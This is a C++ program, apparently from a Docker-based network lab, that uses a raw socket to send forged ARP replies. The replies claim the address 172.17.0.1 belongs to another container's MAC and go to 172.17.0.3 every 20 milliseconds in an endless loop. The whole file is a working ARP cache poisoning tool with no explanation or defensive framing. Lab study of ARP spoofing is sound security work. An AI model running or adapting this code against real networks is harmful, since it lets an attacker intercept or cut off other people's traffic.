#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/if_arp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include<iostream>

struct fakedArp{
    uint16_t hardwareType;
    uint16_t protocol;
    unsigned char hardwareSize;
    unsigned char protocolSize;
    uint16_t operation;
    char sourceMacAddr[6];
    uint32_t sourceIP;
    char targetMacAddr[6];
    uint32_t targetIP;
} __attribute__((__packed__));
using namespace std;
int sock;
int queryNICIndex(string name){
    ifreq newReq;
    strncpy(newReq.ifr_name, name.c_str(), name.size() + 1);
    int ret = ioctl(sock, SIOCGIFINDEX, &newReq);
    if(ret!=0){
        cout<<"fail to launch SIOCGIFINDEX"<<endl;
        return -1;
    }
    return newReq.ifr_ifindex;
}


int main(){

    char buffer[1500];

    sock = socket(AF_PACKET, SOCK_RAW,  htons(ETH_P_ALL));
    if (sock==-1){
        cout<<"failed to start raw socket"<<endl;
        return 0;
    }
    unsigned char sourceMacAddr[6]={0x02,0x42,0xac,0x11,0x00,0x02};
    unsigned char targetMacAddr[6]={0x02,0x42,0xac,0x11,0x00,0x03};
    fakedArp packet;
    packet.hardwareType=htons(0x01);
    packet.protocol=htons(0x0800);
    packet.hardwareSize=6;
    packet.protocolSize=4;
    packet.operation=htons(0x02);

    memcpy(packet.sourceMacAddr,sourceMacAddr,6);
    memcpy(packet.targetMacAddr,targetMacAddr,6);
    inet_pton(AF_INET,"172.17.0.1",&packet.sourceIP);
    inet_pton(AF_INET,"172.17.0.3",&packet.targetIP);

    ethhdr header;
    memcpy(header.h_dest,targetMacAddr,6);
    memcpy(header.h_source,sourceMacAddr,6);
    header.h_proto=htons(ETH_P_ARP);

    memcpy(buffer, &header,14);
    memcpy(buffer+14,&packet,sizeof(fakedArp));
    sockaddr_ll peerMacAddr;
    socklen_t clntAddrSize = sizeof(peerMacAddr);

    memset(&peerMacAddr, 0, sizeof(peerMacAddr));
    int index=queryNICIndex("eth0");
    peerMacAddr.sll_ifindex = index;

    while(1){

    int res=sendto(sock,buffer,14+sizeof(fakedArp),0,(sockaddr *)&peerMacAddr, clntAddrSize);
    usleep(20000);//20ms
    }
    return 0;
}
